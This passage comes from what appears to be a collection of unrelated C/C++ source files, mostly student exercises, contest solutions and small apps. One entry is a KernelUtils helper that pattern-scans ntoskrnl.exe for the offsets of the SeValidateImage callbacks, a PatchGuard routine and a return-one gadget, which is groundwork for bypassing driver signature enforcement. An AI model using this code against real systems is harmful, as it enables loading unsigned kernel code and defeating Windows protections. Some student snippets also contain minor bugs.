calculateForceY(PointMass *nodePtr, PointMass *topTrav){\r\n    return (nodePtr->getYValue()-topTrav->getYValue())/pow(pow((nodePtr->getXValue()-topTrav->getXValue()), 2) + pow((nodePtr->getYValue()-topTrav->getYValue()), 2), 2);\r\n}\r\n\r\ndouble forceX(PointMass *nodePtr, bool leftFalseRightTrue, PointMass *topTrav){ \r\n    if (leftFalseRightTrue){\r\n        if (nodePtr->getRightPtr() == nullptr){\r\n            return 0;\r\n        } else {\r\n            return (calculateForceX(nodePtr, topTrav) + forceX(nodePtr->getRightPtr(), leftFalseRightTrue, topTrav));\r\n        }\r\n    } else {\r\n        if (nodePtr->getLeftPtr() == nullptr){\r\n            return 0;\r\n        } else {\r\n            return (calculateForceX(nodePtr, topTrav) + forceX(nodePtr->getLeftPtr(), leftFalseRightTrue, topTrav));\r\n        }\r\n    }\r\n}\r\n\r\ndouble forceY(PointMass *nodePtr, bool leftFalseRightTrue, PointMass *topTrav){ \r\n    if (leftFalseRightTrue){\r\n        if (nodePtr->getRightPtr() == nullptr){\r\n            return 0;\r\n        } else {\r\n            return (calculateForceY(nodePtr, topTrav) + forceY(nodePtr->getRightPtr(), leftFalseRightTrue, topTrav));\r\n        }\r\n    } else {\r\n        if (nodePtr->getLeftPtr() == nullptr){\r\n            return 0;\r\n        } else {\r\n            return (calculateForceY(nodePtr, topTrav) + forceY(nodePtr->getLeftPtr(), leftFalseRightTrue, topTrav));\r\n        }\r\n    }\r\n}\r\n\r\nint main(){\r\n    double deltaT = 1;\r\n    double endTime = 1000;\r\n    int numberOfBodies = 3;\r\n\r\n    PointMass headMass;\r\n    headMass.PointMass::setValues(0, 0, 0, 0);\r\n    PointMass *trav = nullptr, *head = &headMass, *tail = &headMass;\r\n\r\n    double x, y, vx, vy;\r\n    for (int i = 0; i < numberOfBodies; i++){\r\n        trav = new PointMass;\r\n        trav->setLeftPtr(tail);\r\n        tail->setRightPtr(trav);\r\n        tail = trav;\r\n\r\n        std::cout << \"Please input mass \" << i << \"'s x location, y location, x velocity, and y velocity.\" << std::endl;\r\n        std::cin >> x >> y >> vx >> vy;\r\n        std::cout << std::endl;\r\n\r\n        trav->setValues(x, y, vx, vy);\r\n    }\r\n\r\n    trav = head;\r\n    double forceX, forceY;\r\n    while (trav != nullptr)\r\n    {\r\n        trav->PointMass::setRightPtr(tail);\r\n        std::cout << \"trav right ptr set to Null\" << std::endl;\r\n        trav = nullptr;\r\n        std::cout << \"trav ptr set to nullptr\" << std::endl;\r\n    }\r\n    head = nullptr;\r\n    tail = nullptr;\r\n}",
    "#include <iostream>\r\n#include <algorithm>\r\n#include <cstdio>\r\n#include <vector>\r\n#include <cstring>\r\n#include <string>\r\n#include <cmath>\r\n#include <utility>\r\n#include <map>\r\n#include <set>\r\n#include <queue>\r\n#include <stack>\r\n\r\nusing namespace std;\r\n\r\ntypedef unsigned long long ll;\r\n\r\n#define endl '\\n'\r\n#define pb push_back\r\n#define ff first\r\n#define ss second\r\n#define fastIO cin.tie(nullptr)->sync_with_stdio(false);\r\n#define TIME (1.0 * clock() / CLOCKS_PER_SEC)\r\nconst int nmax = 2e5+7;\r\nll n, l, r;\r\nll a[nmax], dp[nmax];\r\nll pref[nmax];\r\n\r\nint check(ll val) {\r\n   if (val>r || val<l) return 0;\r\n   return 1;\r\n}\r\n\r\nsigned main() {\r\n   fastIO;\r\n   int tt; cin >> tt;\r\n   while (tt--) {\r\n      cin >> n >> l >> r;\r\n      for (int i = 0; i <= n; ++i) dp[i]=0;\r\n      for (int i = 1; i <= n; ++i) {\r\n         cin >> a[i];\r\n         pref[i]=pref[i-1]+a[i];\r\n      }\r\n      for (int i = 1; i <= n; ++i) {\r\n         // for (int j = 0; j < n; ++j) {\r\n         //    dp[i]=max(dp[i], dp[j]+check(pref[i]-pref[j]));\r\n         // }\r\n         int pos = lower_bound(pref+i+1, pref+n+1, l+pref[i])-pref;\r\n         cout << pos << \" \";\r\n      }\r\n      cout << endl;\r\n      for (int i = 1; i <= n; ++i) cout << dp[i] << \" \";\r\n      cout << endl << endl;\r\n   }\r\n   return 0;\r\n}",
    "#include \"Utils.h\"\n\nULONG64 KernelUtils::GetNtoskrnlBase()\n{\n\tDWORD CbNeeded = 0;\n\tLPVOID Drivers[1024] = { 0 };\n\tif (K32EnumDeviceDrivers(Drivers, sizeof(Drivers), &CbNeeded))\n\t\treturn (ULONG64)Drivers[0];\n\telse\n\t\treturn 0;\n}\n\nULONG64 KernelUtils::GetSeValidateImageHeaderOffset()\n{\n\tscanner::handle SeValidateImageHeaderSignature\t= scanner::pattern(\"C:\\\\windows\\\\system32\\\\ntoskrnl.exe\").scan_now(\"SeValidateImageHeader\", \"48 39 35 ? ? ? ? 48 8B F9 48 89 70 F0 44 8B DE\").get_result();\n\tuint8_t* SignaturePatternBegin\t\t\t\t\t= SeValidateImageHeaderSignature.as<uint8_t*>();\n\tULONG32 RIPOffsetSeValidateImageHeaderCallback\t= *(ULONG32*)(&SignaturePatternBegin[3]);\n\tULONG32 RIPInstructionLength\t\t\t\t\t= 7;\n\tULONG64* SeValidateImageHeaderCallbackAddress\t= SeValidateImageHeaderSignature.add(RIPOffsetSeValidateImageHeaderCallback + RIPInstructionLength).as<ULONG64*>();\n\n\treturn (ULONG64)SeValidateImageHeaderCallbackAddress - (ULONG64)SeValidateImageHeaderSignature.get_base<uint64_t*>();\n}\n\nULONG64 KernelUtils::GetSeValidateImageDataOffset()\n{\n\tscanner::handle SeValidateImageDataSignature\t= scanner::pattern(\"C:\\\\windows\\\\system32\\\\ntoskrnl.exe\").scan_now(\"SeValidateImageData\", \"48 8B 05 ? ? ? ? 4C 8B D1 48 85 C0 74 ?\").get_result();\n\tauto SignaturePatternBegin\t\t\t\t\t\t= SeValidateImageDataSignature.as<uint8_t*>();\n\n\tULONG32 RIPOffsetSeValidateImageDataCallback\t= *(ULONG32*)(&SignaturePatternBegin[3]);\n\tULONG32 RIPInstructionLength\t\t\t\t\t= 7;\n\tULONG64* SeValidateImageDataCallbackAddress\t\t= SeValidateImageDataSignature.add(RIPOffsetSeValidateImageDataCallback + RIPInstructionLength).as<ULONG64*>();\n\n\treturn (ULONG64)SeValidateImageDataCallbackAddress - (ULONG64)SeValidateImageDataSignature.get_base<ULONG64*>();\n}\n\nULONG64 KernelUtils::GetReturnOffset()\n{\n\tscanner::handle RetSignature\t= scanner::pattern(\"C:\\\\windows\\\\system32\\\\ntoskrnl.exe\").scan_now(\"ret\", \"B8 01 00 00 00 C3\", \".text\").get_result();\n\tULONG64* RetAddress\t\t\t\t= RetSignature.as<ULONG64*>();\n\n\treturn (ULONG64)RetSignature.as<ULONG64*>() - (ULONG64)RetSignature.get_base<ULONG64*>();\n}\n\nULONG64 KernelUtils::GetPatchGaurdOffset()\n{\n\tscanner::handle PatchGuardSignature = scanner::pattern(\"C:\\\\windows\\\\system32\\\\ntoskrnl.exe\").scan_now(\"PatchGuard\", \"38 0D ? ? ? ? 75 02 EB FE\").get_result();\n\t\n\tuint8_t* SignaturePatternBegin\t\t= PatchGuardSignature.as<uint8_t*>();\n\tULONG32 RIPOffsetPatchGuardCallback = *(ULONG32*)(&SignaturePatternBegin[2]);\n\tULONG32 RIPInstructionLength\t\t= 6;\n\tULONG64* PatchGuardCallbackAddress\t= PatchGuardSignature.add(RIPOffsetPatchGuardCallback + RIPInstructionLength).as<ULONG64*>();\n\n\treturn (ULONG64)PatchGuardCallbackAddress - (ULONG64)PatchGuardSignature.get_base<ULONG64*>();\n}\n\nULONG64 KernelUtils::GetPatchGaurdValueOffset()\n{\n\tscanner::handle  PatchGuardValueSignature = scanner::pattern(\"C:\\\\windows\\\\system32\\\\ntoskrnl.exe\").scan_now(\"patchguardvalue\", \"00 00 00 00 00 00 00 00\", \".rdata\").get_result();\n\t\n\tULONG64* PatchGuardValueAddress = PatchGuardValueSignature.as<uint64_t*>();\n\treturn (ULONG64)PatchGuardValueAddress - (ULONG64)PatchGuardValueSignature.get_base<uint64_t*>();\n}",
    "#include <gst/gst.h>\n#include <gst/video/video.h>\n#include <opencv2/opencv.hpp>\n#include <vector>\n#include <sstream>\n\nGST_DEBUG_CATEGORY_STATIC(ubnt_mask_debug);\n#define GST_CAT_DEFAULT ubnt_mask_debug\n\n#define UBNT_TYPE_MASK (ubnt_mask_get_type())\nG_DECLARE_FINAL_TYPE(UbntMask, ubnt_mask, UBNT, MASK, GstElement)\n\nstruct _UbntMask {\n    GstElement parent;\n    GstPad *sinkpad, *srcpad;\n    GstVideoInfo info;\n    std::vector<std::vector<cv::Point>> mask_points;\n};\n\nG_DEFINE_TYPE(UbntMask, ubnt_mask, GST_TYPE_ELEMENT);\n\nstatic GstFlowReturn ubnt_mask_transform_frame_ip(UbntMask *filter, GstBuffer *buf);\n\nstatic GstStaticPadTemplate sink_template = GST_STATIC_PAD_TEMPLATE(\n    \"sink\",\n    GST_PAD_SINK,\n    GST_PAD_ALWAYS,\n    GST_STATIC_CAPS(\"video/x-raw, format=(string)NV12, width=(int)[1,MAX], height=(int)[1,MAX], framerate=(fraction)[0/1,MAX], interlace-mode=(string)progressive\")\n);\n\nstatic GstStaticPadTemplate src_template = GST_STATIC_PAD_TEMPLATE(\n    \"src\",\n    GST_PAD_SRC,\n    GST_PAD_ALWAYS,\n    GST_STATIC_CAPS(\"video/x-raw, format=(string)NV12, width=(int)[1,MAX], height=(int)[1,MAX], framerate=(fraction)[0/1,MAX], interlace-mode=(string)progressive\")\n);\n\nenum {\n    PROP_0,\n    PROP_MASK_POINTS,\n    N_PROPERTIES\n};\n\nstatic GParamSpec *obj_properties[N_PROPERTIES] = { NULL, };\n\nstatic void ubnt_mask_set_property(GObject *object, guint prop_id, const GValue *value, GParamSpec *pspec) {\n    UbntMask *filter = UBNT_MASK(object);\n\n    switch (prop_id) {\n        case PROP_MASK_POINTS: {\n            const std::string str = g_value_get_string(value);\n            std::vector<std::vector<cv::Point>> polygons;\n            std::vector<cv::Point> points;\n            std::istringstream polygon_stream(str);\n            std::string polygon;\n\n            while (std::getline(polygon_stream, polygon, ';')) {\n                std::istringstream point_stream(polygon);\n                std::string point_str;\n\n                while (std::getline(point_stream, point_str, ',')) {\n                    int x, y;\n                    std::istringstream point_iss(point_str);\n                    char separator;\n                    if (point_iss >> x >> separator >> y && separator == ':') {\n                        points.push_back(cv::Point(x, y));\n                    }\n                }\n\n                if (!points.empty()) {\n                    polygons.push_back(points);\n                    points.clear();\n                }\n            }\n            \n            filter->mask_points = polygons;\n            break;\n        }\n        default:\n            G_OBJECT_WARN_INVALID_PROPERTY_ID(object, prop_id, pspec);\n            break;\n    }\n}\n\nstatic void ubnt_mask_get_property(GObject *object, guint prop_id, GValue *value, GParamSpec *pspec) {\n    UbntMask *filter = UBNT_MASK(object);\n\n    switch (prop_id) {\n        case PROP_MASK_POINTS: {\n            GString *str = g_string_new(NULL);\n            for (const auto &polygon : filter->mask_points) {\n                for (const auto &point : polygon) {\n                    g_string_append_printf(str, \"%d:%d,\", point.x, point.y);\n                }\n                g_string_truncate(str, str->len - 1); // Remove the last comma\n                g_string_append(str, \";\");\n            }\n            g_string_truncate(str, str->len - 1); // Remove the last semicolon\n            g_value_set_string(value, str->str);\n            g_string_free(str, TRUE);\n            break;\n        }\n        default:\n            G_OBJECT_WARN_INVALID_PROPERTY_ID(object, prop_id, pspec);\n            break;\n    }\n}\n\nstatic gboolean ubnt_mask_sink_event(GstPad *pad, GstObject *parent, GstEvent *event) {\n    UbntMask *filter = UBNT_MASK(parent);\n    gboolean ret;\n\n    switch (GST_EVENT_TYPE(event)) {\n        case GST_EVENT_CAPS: {\n            GstCaps *caps;\n            gst_event_parse_caps(event, &caps);\n            gst_video_info_from_caps(&filter->info, caps);\n            ret = gst_pad_set_caps(filter->srcpad, caps);\n            gst_event_unref(event);\n            break;\n        }\n        default:\n            ret = gst_pad_event_default(pad, parent, event);\n            break;\n    }\n    return ret;\n}\n\nstatic GstFlowReturn ubnt_mask_chain(GstPad *pad, GstObject *parent, GstBuffer *buf) {\n    UbntMask *filter = UBNT_MASK(parent);\n    return ubnt_mask_transform_frame_ip(filter, buf);\n}\n\nstatic void ubnt_mask_class_init(UbntMaskClass *klass) {\n    GObjectClass *gobject_class = G_OBJECT_CLASS(klass);\n    GstElementClass *gstelement_class = GST_ELEMENT_CLASS(klass);\n\n    gobject_class->set_property = ubnt_mask_set_property;\n    gobject_class->get_property = ubnt_mask_get_property;\n\n    obj_properties[PROP_MASK_POINTS] = g_param_spec_string(\n        \"mask-points\",\n        \"Mask Points\",\n        \"Coordinates of the mask points in 'x:y,x:y;...' format\",\n        NULL,\n        (GParamFlags)(G_PARAM_READWRITE | G_PARAM_STATIC_STRINGS)\n    );\n\n    g_object_class_install_properties(gobject_class, N_PROPERTIES, obj_properties);\n\n    gst_elem",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bitcoin_ticker\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*******************************************************************************\r\n * @brief Solution for exercise 3, 2024-08-21.\r\n *******************************************************************************/\r\n#include <fstream>\r\n#include <iostream>\r\n#include <vector>\r\n\r\nnamespace vector\r\n{\r\n\r\n/*******************************************************************************\r\n * @brief Provides the smallest integer held by specified vector.\r\n * \r\n * @param data Reference to the vector in question.\r\n * \r\n * @return The smallest integer in the vector (or 0 if the vector is empty).\r\n ******************************************************************************/\r\nint getSmallestInt(const std::vector<int>& data)\r\n{\r\n    if (data.empty()) { return 0; }\r\n    auto smallest{data[0U]};\r\n    \r\n    for (const auto& num : data)\r\n    {\r\n        if (num < smallest) { smallest = num; }\r\n    }\r\n    return smallest;\r\n}\r\n\r\n/*******************************************************************************\r\n * @brief Prints the content held by specified vector.\r\n * \r\n * @param data    Reference to the vector in question.\r\n * @param ostream Reference to output stream (default = terminal print).\r\n ******************************************************************************/\r\nvoid print(const std::vector<int>& data, std::ostream& ostream = std::cout)\r\n{\r\n    ostream << \"--------------------------------------------------------------------------------\\n\";\r\n    for (const auto& i : data)\r\n    {\r\n        ostream << i << \"\\n\";\r\n    }\r\n    ostream << \"--------------------------------------------------------------------------------\\n\\n\";\r\n}\r\n\r\n/*******************************************************************************\r\n * @brief Erases the smallest integer held by specified vector.\r\n *        Potential duplicates of the smallest integer are also removed.\r\n * \r\n * @param data    Reference to the vector in question.\r\n ******************************************************************************/\r\nvoid eraseSmallestInt(std::vector<int>& data)\r\n{\r\n    if (data.empty()) { return; }\r\n    const auto smallest{vector::getSmallestInt(data)};\r\n\r\n    while (1)\r\n    {\r\n        for (auto i{data.begin()}; i < data.end(); ++i) \r\n        {\r\n            if (*i == smallest) { data.erase(i); }\r\n        }\r\n        if (smallest != vector::getSmallestInt(data)) { break; }\r\n    }\r\n}\r\n\r\n} // namespace vector\r\n\r\n/*******************************************************************************\r\n * @brief Removes the smallest integer (including duplicates) held by a \r\n *        specific vector. The vector content is printed in the terminal\r\n *        and to a file named \"numbers.txt\".\r\n * \r\n * @return Success code 0 upon termination of the program.\r\n *******************************************************************************/\r\nint main()\r\n{\r\n    std::vector<int> numbers{1, 2, -5, 5, 4, 8, 9, 0, -3, -5, -5, -5, -2};\r\n    std::ofstream ostream{\"numbers.txt\"};\r\n    vector::eraseSmallestInt(numbers);\r\n    vector::print(numbers);\r\n    vector::print(numbers, ostream);\r\n    return 0;\r\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <deque>\n#define STR_SIZE 10000\n#define EVAL_OUTPUT_FILE \"./_eval.score\"\n\nFILE *fpin, *fpout, *fpans, *fprlt;\n/* Output message and exit */\nvoid output(char *s, int d)\n{\n\tif (fprlt) {\n\t\tfprintf (fprlt, \"%s\\n%d\\n\", s, d);\n\t\tfclose(fprlt);\n\t}\n\texit(d != 0);\n}\n\n/* Open files and check */\nvoid open_files(char *in, char *out, char *ans, char *eval_output)\n{\n\tif ((fprlt = fopen (eval_output, \"w\")) == NULL) {\n\t\tfprintf (stderr, \"Can not open %s!\\n\", EVAL_OUTPUT_FILE);\n\t\toutput (\"Can not open eval record file!\", 0);\n\t}\n\n\tif ((fpin = fopen (in, \"r\")) == NULL) {\n\t\tfprintf (stderr, \"Can not open %s!\\n\", out);\n\t\toutput (\"Can not open input file!\", 0);\n\t}\n\n\tif ((fpout = fopen (out, \"r\")) == NULL) {\n\t\tfprintf (stderr, \"Can not open %s!\\n\", out);\n\t\toutput (\"Can not open player's output file!\", 0);\n\t}\n\n\tif ((fpans = fopen (ans, \"r\")) == NULL) {\n\t\tfprintf (stderr, \"Can not open %s!\\n\", ans);\n\t\toutput (\"Can not open standard answer!\", 0);\n\t}\n}\n\nint a[2222222];\nstd::deque<int> q[333];\n\nint specialJudge(FILE *in, FILE *out, FILE *ans){\n// TODO: write your special judge here\n\tint T;\n\tfscanf(in, \"%d\", &T);\n\twhile(T--){\n\t\tint n,m,k;\n\t\tfscanf(in, \"%d%d%d\", &n,&m,&k);\n\t\tfor(int i=1;i<=m;++i){\n\t\t\tfscanf(in, \"%d\", a+i);\n\t\t}\n\t\tint now=1;\n\t\tint op;\n\t\tif(fscanf(out, \"%d\", &op)!=1){\n\t\t\treturn 0;\n\t\t}\n\t\tif(op<m||op>2*m){\n\t\t\treturn 0;\n\t\t}\n\t\tfor(int i=1;i<=op;++i){\n\t\t\tint v,s1,s2;\n\t\t\tif(fscanf(out, \"%d\", &v)!=1){\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tif(v==1){\n\t\t\t\tif(fscanf(out, \"%d\", &s1)!=1){\n\t\t\t\t\treturn 0;\n\t\t\t\t}\n\t\t\t\tif(s1<=0||s1>n){\n\t\t\t\t\treturn 0;\n\t\t\t\t}\n\t\t\t\tif(now<=m){\n\t\t\t\t\tif(!q[s1].empty()&&a[now]==q[s1].back()){\n\t\t\t\t\t\tq[s1].pop_back();\n\t\t\t\t\t}\n\t\t\t\t\telse{\n\t\t\t\t\t\tq[s1].push_back(a[now]);\n\t\t\t\t\t}\n\t\t\t\t\t++now;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if(v==2){\n\t\t\t\tif(fscanf(out, \"%d%d\", &s1, &s2)!=2){\n\t\t\t\t\treturn 0;\n\t\t\t\t}\n\t\t\t\tif(s1<=0||s1>n||s2<=0||s2>n||s1==s2){\n\t\t\t\t\treturn 0;\n\t\t\t\t}\n\t\t\t\tif(!q[s1].empty()&&!q[s2].empty()&&q[s1].front()==q[s2].front()){\n\t\t\t\t\tq[s1].pop_front();\n\t\t\t\t\tq[s2].pop_front();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse return 0;\n\t\t}\n\t\tif(now<=m){\n\t\t\treturn 0;\n\t\t}\n\t\tfor(int i=1;i<=n;++i){\n\t\t\tif(q[i].size()){\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t}\n\t}\n\treturn 1;\n}\n\nint main (int argc, char *argv[])\n{\n\tif (argc != 4) {\n\t\tfprintf (stderr, \"Usage: mason_e <in> <out> <ans>\\n\");\n\t\toutput (\"Invalid Call!\", 0);\n\t}\n\n\topen_files (argv[1], argv[2], argv[3], EVAL_OUTPUT_FILE);\n\n\t/* compare the contents */\n\tif (specialJudge(fpin, fpout, fpans))\n\t\toutput(\"Right Output!!!\", 10);\n\telse\n\t\toutput (\"Wrong Answer\", 0);\n\treturn 0;\n}\n",
    "#include \"iostream\" // Include the input-output stream library\n\nstruct Node { // Define the structure for a Node in the linked list\n    int data; // Integer data held by the node\n    struct Node* next; // Pointer to the next node in the list\n};\n\n// Function to insert a node at the front of the linked list\nvoid insertFront(struct Node **head, int data) {\n    // Allocate memory for a new node\n    struct Node *newNode = (struct Node*) malloc(sizeof(struct Node));\n\n    // Assign the data to the new node\n    newNode->data = data;\n\n    // Set the next pointer of the new node to the current head\n    newNode->next = *head;\n\n    // Update the head to point to the new node\n    *head = newNode;\n}\n\n// Function to delete a node from the front of the linked list\nvoid deleteFront(struct Node *&head) {\n    // Temporary pointer to store the current head\n    struct Node *temp = head;\n\n    // If the list is empty, print a message and return\n    if (head == NULL) {\n        std::cout << \"Linked List Empty, nothing to delete \";\n        return;\n    }\n\n    // Print the data of the node being deleted\n    std::cout << \"\\nValue deleted: \" << temp->data;\n\n    // Update the head to point to the next node\n    head = head->next;\n\n    // Free the memory of the deleted node\n    delete temp;\n}\n\n// Function to display the linked list\nvoid display(struct Node *node) {\n    std::cout << \"\\n\\n\"; // Print a new line for formatting\n\n    // Traverse the list and print each node's data\n    while (node != NULL) {\n        std::cout << node->data << \" \"; // Print the data\n        node = node->next; // Move to the next node\n    }\n    std::cout << \"\\n\"; // Print a new line at the end\n}\n\n// Main function to demonstrate linked list operations\nint main() {\n    struct Node *head = NULL; // Initialize the head of the linked list to NULL\n\n    // Insert nodes at the front of the list\n    insertFront(&head, 6);\n    insertFront(&head, 12);\n    insertFront(&head, 18);\n    insertFront(&head, 76);\n    insertFront(&head, 3);\n    insertFront(&head, 15);\n\n    // Display the list\n    display(head);\n\n    // Delete nodes from the front of the list\n    deleteFront(head);\n    deleteFront(head);\n\n    // Display the list again\n    display(head);\n\n    return 0; // Return 0 to indicate successful execution\n}\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <numeric>\nusing namespace std;\n\nvoid distributeApples(vector<int> &apples, int totalWeight) {\n    vector<int> ram, sham, rahim;\n    int ramShare = 50 * totalWeight / 100;\n    int shamShare = 30 * totalWeight / 100;\n    int rahimShare = 20 * totalWeight / 100;\n    \n    for (int weight : apples) {\n        if (ramShare >= weight) {\n            ram.push_back(weight);\n            ramShare -= weight;\n        } else if (shamShare >= weight) {\n            sham.push_back(weight);\n            shamShare -= weight;\n        } else if (rahimShare >= weight) {\n            rahim.push_back(weight);\n            rahimShare -= weight;\n        }\n    }\n\n    cout << \"Ram: \";\n    for (int weight : ram) cout << weight << \" \";\n    cout << endl;\n\n    cout << \"Sham: \";\n    for (int weight : sham) cout << weight << \" \";\n    cout << endl;\n\n    cout << \"Rahim: \";\n    for (int weight : rahim) cout << weight << \" \";\n    cout << endl;\n}\n\nint main() {\n    vector<int> apples;\n    int weight;\n    \n    while (true) {\n        cout << \"Enter apple weight in grams (-1 to stop): \";\n        cin >> weight;\n        \n        if (weight == -1) {\n            break;\n        }\n        \n        apples.push_back(weight);\n    }\n\n\n    sort(apples.rbegin(), apples.rend()); // Sort in descending order\n\n    int totalWeight = accumulate(apples.begin(), apples.end(), 0);\n    distributeApples(apples, totalWeight);\n\n    return 0;\n}\n",
    "// Ward - Currency Converter\n// 08/03/2024\n\n#include <iostream>\n#include <iomanip>\n\nusing namespace std;\n\ndouble getExchangeRate(const string& currencyCode) {\n    if (currencyCode == \"EUR\") {\n        return 1 / 1.09;\n    } else if (currencyCode == \"GBP\") {\n        return 1 / 1.487;\n    } else if (currencyCode == \"JPY\") {\n        return 1 / 0.00955;\n    } else if (currencyCode == \"INR\") {\n        return 1 / 0.013;\n    } else if (currencyCode == \"CNY\") {\n        return 1 / 0.14;\n    } else {\n        cerr << \"Invalid currency code: \" << currencyCode << endl;\n        return 0;\n    }\n}\n\nint main() {\n    double usdAmount;\n\n    cout << \"Enter the amount in US Dollars for conversion: \";\n    if (!(cin >> usdAmount)) {\n        cerr << \"Invalid input. Please enter a numeric value.\" << endl;\n        return 1;\n    }\n\n    cout << fixed << setprecision(2);\n\n    cout << usdAmount << \" USD is equivalent to:\\n\";\n    cout << \"Euros: \" << getExchangeRate(\"EUR\") * usdAmount << \" EUR\" << endl;\n    cout << \"British Pounds: \" << getExchangeRate(\"GBP\") * usdAmount << \" GBP\" << endl;\n    cout << \"Japanese Yen: \" << getExchangeRate(\"JPY\") * usdAmount << \" JPY\" << endl;\n    cout << \"Indian Rupees: \" << getExchangeRate(\"INR\") * usdAmount << \" INR\" << endl;\n    cout << \"Chinese Yuan: \" << getExchangeRate(\"CNY\") * usdAmount << \" CNY\" << endl;\n\n    return 0;\n}\n",
    "#include<iostream>\r\n#include<conio.h>\r\n\r\nusing namespace std;\r\n\r\n#define KEY_UP 72\r\n#define KEY_DOWN 80\r\n#define KEY_LEFT 75\r\n#define KEY_RIGHT 77\r\n\r\n#define KEY_W 119 \r\n#define KEY_A 97  \r\n#define KEY_S 115 \r\n#define KEY_D 100\r\n\r\nstruct player{\r\n        int num;\r\n        int x;\r\n        int y;\r\n};\r\n\r\nint turf[5][10] = {0};\r\n\r\nvoid printTurf(int turf[5][10])\r\n{\r\n    for (int i = 0; i < 5; i++)\r\n    {\r\n        for ( int j = 0; j < 10; j++)\r\n            cout << turf[i][j] << \" \";\r\n        cout << endl;\r\n    }\r\n    cout << endl;\r\n}\r\n\r\nvoid up(int turf[5][10], player* p1, player *p2)\r\n{\r\n\r\n    turf[p1->x][p1->y] = 0;\r\n\r\n    p1->x=p1->x-1;\r\n\r\n    turf[p1->x][p1->y] = p1->num;\r\n}\r\n\r\nvoid down(int turf[5][10], player* p1, player *p2)\r\n{\r\n    turf[p1->x][p1->y] = 0;\r\n\r\n    p1->x=p1->x+1;\r\n\r\n    turf[p1->x][p1->y] = p1->num;\r\n}\r\n\r\nvoid left(int turf[5][10], player* p1, player *p2)\r\n{\r\n    turf[p1->x][p1->y] = 0;\r\n\r\n    p1->y=p1->y-1;\r\n\r\n    turf[p1->x][p1->y] = p1->num;\r\n}\r\n\r\nvoid right(int turf[5][10], player* p1, player *p2)\r\n{\r\n    turf[p1->x][p1->y] = 0;\r\n\r\n    p1->y=p1->y+1;\r\n\r\n    turf[p1->x][p1->y] = p1->num;\r\n}\r\n\r\nvoid up2(int turf[5][10], player* p1, player *p2)\r\n{\r\n    turf[p2->x][p2->y] = 0;\r\n\r\n    p2->x=p2->x-1;\r\n\r\n    turf[p2->x][p2->y] = p2->num;\r\n}\r\n\r\nvoid down2(int turf[5][10], player* p1, player *p2)\r\n{\r\n    turf[p2->x][p2->y] = 0;\r\n\r\n    p2->x=p2->x+1;\r\n\r\n    turf[p2->x][p2->y] = p2->num;\r\n}\r\n\r\nvoid left2(int turf[5][10], player* p1, player *p2)\r\n{\r\n    turf[p2->x][p2->y] = 0;\r\n\r\n    p2->y=p2->y-1;\r\n\r\n    turf[p2->x][p2->y] = p2->num;\r\n}\r\n\r\nvoid right2(int turf[5][10], player* p1, player *p2)\r\n{\r\n    turf[p2->x][p2->y] = 0;\r\n\r\n    p2->y=p2->y+1;\r\n\r\n    turf[p2->x][p2->y] = p2->num;\r\n}\r\n\r\nvoid play(int turf[5][10], player p1, player p2)\r\n{\r\n    int c = 0;\r\n    while(1)\r\n    {\r\n        c = 0;\r\n        switch(c=getch()){\r\n        case KEY_UP:\r\n            up(turf, &p1 , &p2);\r\n            break;\r\n        case KEY_DOWN:\r\n            down(turf, &p1, &p2);\r\n            break;\r\n        case KEY_LEFT:\r\n            left(turf, &p1, &p2);\r\n            break;\r\n        case KEY_RIGHT:\r\n            right(turf, &p1, &p2);\r\n            break;\r\n        case KEY_W:\r\n            up2(turf, &p1, &p2);\r\n            break;\r\n        case KEY_A:\r\n            left2(turf, &p1, &p2);\r\n            break;\r\n        case KEY_S:\r\n            down2(turf, &p1, &p2);\r\n            break;\r\n        case KEY_D:\r\n            right2(turf, &p1, &p2);\r\n            break;\r\n        }\r\n        system(\"cls\");\r\n        printTurf(turf);\r\n    }\r\n\r\n}\r\n\r\n\r\nint main()\r\n{\r\n    player p1;\r\n    p1.num = 7;\r\n    p1.x = 2;\r\n    p1.y = 0;\r\n\r\n    player p2;\r\n    p2.num = 1;\r\n    p2.x = 2;\r\n    p2.y = 9;\r\n\r\n    //initial positions\r\n    turf[p1.x][p1.y] = p1.num;\r\n    turf[p2.x][p2.y] = p2.num;\r\n\r\n    printTurf(turf);    \r\n\r\n    play(turf, p1, p2);\r\n    \r\n}",
